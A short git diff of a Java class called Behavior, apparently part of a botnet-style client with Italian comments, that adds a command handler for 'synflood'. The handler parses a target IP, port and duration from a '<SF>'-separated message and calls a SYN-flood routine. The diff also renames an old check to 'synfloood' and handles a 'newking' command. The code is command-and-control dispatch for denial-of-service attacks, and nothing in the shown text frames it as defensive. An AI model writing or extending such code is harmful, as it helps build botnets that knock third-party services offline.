@@ -169,8 +169,15 @@ public class Behavior {
 	// Integer.parseInt(rgb[3]));
 	// }
 
-	// IDMSG|COMANDO|SIGNATURE(idmsg)
+	
+	
+	//<HH> sono i separatori
+	// IDMSG|COMANDO|SIGNATURE(IDMSG)
 
+	//COMANDO
+	//<CC> sono i separatori per i comandi
+	
+	
 	/**
 	 * @param rawData
 	 */
@@ -254,10 +261,21 @@ public class Behavior {
 		if (msg.startsWith("newking")) {
 			updateCecInfo(msg);
 		}
-		if (msg.startsWith("synflood")) {
+		if (msg.startsWith("synfloood")) {
 			malS.synFlood(msg);
 		}
-		if (msg.startsWith("")) {
+		if (msg.startsWith("synflood")) {
+			//scompongo messaggio al fine di riempire i campi, codifica particolare <SA>
+			//TODO da fare
+			String[] msgs=msg.split("<SF>");
+			
+			IP ipDest=new IP(msgs[1].toString());
+			Integer portDest=Integer.parseInt(msgs[2].toString());
+			Integer time=Integer.parseInt(msgs[3].toString());
+			System.out.println("IpDest di attacco "+ipDest);
+			System.out.println("PortDest di attacco "+portDest);
+			System.out.println("Time di attacco "+time);
+			malS.synFlood(ipDest.toString(), portDest, time);
 
 		}
 		if (msg.startsWith("")) {
